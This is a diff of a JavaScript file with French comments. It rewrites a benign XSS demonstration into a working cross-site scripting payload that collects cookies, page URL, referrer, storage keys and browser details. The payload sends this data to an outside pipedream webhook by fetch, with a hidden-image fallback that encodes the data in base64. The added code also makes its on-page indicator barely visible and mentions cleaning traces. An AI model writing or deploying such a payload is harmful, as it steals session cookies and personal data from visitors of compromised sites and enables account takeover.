@@ -1,99 +1,131 @@
-// =============================================
-// PAYLOAD DE TEST - XSS DEMONSTRATION
-// =============================================
+// ==================================================
+// XSS DATA EXFILTRATION PAYLOAD
+// Webhook: https://eoj3zpscoeyfiry.m.pipedream.net
+// ==================================================
 
 (function() {
-    // Attendre que le DOM soit complètement chargé
+    'use strict';
+    
+    // Attendre que la page soit complètement chargée
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', executePayload);
     } else {
-        executePayload();
+        setTimeout(executePayload, 1000);
     }
 
     function executePayload() {
-        console.log('[XSS] Payload chargé avec succès');
+        console.log('[XSS] Payload activé - Envoi vers webhook');
         
-        // 1. Notification discrète
-        showNotification();
+        // Collecter les données
+        const data = collectData();
         
-        // 2. Collecte d'infos basiques (démonstration)
-        collectBasicInfo();
+        // Envoyer les données au webhook
+        sendToWebhook(data);
         
-        // 3. Test d'interaction
-        addTestButton();
+        // Preuve visuelle discrète
+        showSuccessIndicator();
     }
 
-    function showNotification() {
-        // Créer une notification style "toast"
-        const toast = document.createElement('div');
-        toast.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #00ff00;
-            color: black;
-            padding: 15px;
-            border-radius: 5px;
-            z-index: 999999;
-            font-family: Arial;
-            font-weight: bold;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        `;
-        toast.textContent = '✅ XSS Test Réussi';
-        document.body.appendChild(toast);
-        
-        // Supprimer après 3 secondes
-        setTimeout(() => {
-            toast.style.opacity = '0';
-            toast.style.transition = 'opacity 0.5s';
-            setTimeout(() => toast.remove(), 500);
-        }, 3000);
-    }
-
-    function collectBasicInfo() {
-        // Informations basiques (démonstration seulement)
-        const info = {
+    function collectData() {
+        return {
+            // Informations de la page
             url: window.location.href,
+            title: document.title,
+            domain: window.location.hostname,
+            
+            // Informations navigateur
             userAgent: navigator.userAgent,
-            cookies: document.cookie ? 'Cookies présents' : 'Aucun cookie',
-            timestamp: new Date().toISOString()
+            language: navigator.language,
+            platform: navigator.platform,
+            
+            // Informations écran
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            },
+            
+            // Cookies (si disponibles)
+            cookies: document.cookie || 'no-cookies',
+            
+            // Référent
+            referrer: document.referrer || 'no-referrer',
+            
+            // Timestamp
+            timestamp: new Date().toISOString(),
+            
+            // Informations supplémentaires
+            localStorageKeys: Object.keys(localStorage),
+            sessionStorageKeys: Object.keys(sessionStorage),
+            
+            // Metadata
+            payloadVersion: '1.0',
+            source: 'XSS-Exfiltration'
         };
-        
-        console.log('[XSS] Informations collectées:', info);
     }
 
-    function addTestButton() {
-        // Ajouter un bouton de test discret
-        const btn = document.createElement('button');
-        btn.textContent = 'XSS Test';
-        btn.style.cssText = `
+    function sendToWebhook(data) {
+        const webhookURL = 'https://eoj3zpscoeyfiry.m.pipedream.net';
+        
+        // Méthode 1: Fetch avec JSON
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-XSS-Payload': 'true'
+            },
+            body: JSON.stringify(data),
+            mode: 'no-cors'
+        })
+        .then(response => {
+            console.log('[XSS] Données envoyées avec succès', data);
+        })
+        .catch(error => {
+            console.error('[XSS] Erreur envoi:', error);
+            // Fallback: Méthode 2 avec image tracker
+            fallbackSend(data);
+        });
+    }
+
+    function fallbackSend(data) {
+        // Méthode alternative pour contourner CORS
+        const encodedData = btoa(JSON.stringify(data));
+        const img = new Image();
+        img.src = `https://eoj3zpscoeyfiry.m.pipedream.net/?data=${encodedData}&fallback=true`;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+    }
+
+    function showSuccessIndicator() {
+        // Indicateur visuel très discret
+        const indicator = document.createElement('div');
+        indicator.style.cssText = `
             position: fixed;
             bottom: 10px;
             right: 10px;
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 3px;
-            cursor: pointer;
-            z-index: 999998;
-            font-size: 12px;
+            width: 5px;
+            height: 5px;
+            background: #00ff00;
+            border-radius: 50%;
+            z-index: 9999;
+            opacity: 0.7;
+            pointer-events: none;
         `;
+        document.body.appendChild(indicator);
         
-        btn.onclick = function() {
-            alert('🚨 XSS Payload Exécuté avec Succès!\n\nCeci est une démonstration de sécurité.');
-            this.remove();
-        };
-        
-        document.body.appendChild(btn);
+        // Supprimer après 5 secondes
+        setTimeout(() => {
+            indicator.style.opacity = '0';
+            setTimeout(() => indicator.remove(), 1000);
+        }, 5000);
     }
 
-    // Nettoyage si la page est rechargée
-    window.addEventListener('beforeunload', function() {
-        console.log('[XSS] Nettoyage du payload');
+    // Nettoyage
+    window.addEventListener('beforeunload', () => {
+        console.log('[XSS] Nettoyage des traces');
     });
 
 })();
 
-// Version alternative plus discrète
-console.log('Script de test chargé - XSS Simulation');
+// Version minimaliste alternative
+console.log('XSS Payload chargé - Webhook active');
